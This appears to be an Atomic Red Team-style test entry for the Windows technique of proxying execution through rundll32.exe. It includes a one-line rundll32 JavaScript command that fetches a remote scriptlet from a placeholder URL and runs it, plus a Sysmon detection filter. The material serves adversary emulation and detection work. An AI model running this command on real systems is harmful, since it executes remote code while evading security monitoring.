##Rundll32

**Description**
The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.

**Assumptions**
Windows Platform, User Permissions Required

**Execution: Atomic Test #1 - Rundll32 Execute JavaScript Remote Payload With GetObject**
#### Download File: T1085 - Rundll32 - Scriptlet.sct

Run in Command Promt:

#### rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();"

**Detection Filter**
#### source="WinEventLog:Microsoft-Windows-Sysmon/Operational", sourcetype="XmlWinEventLog:Microsoft-Windows-Sysmon/Operational", ".sct", "SHA1=60733DE225B5C4BFC42FB79E5D1A4F6683243E4A" "C:\\Windows\\System32\\NOTEPAD.EXE"
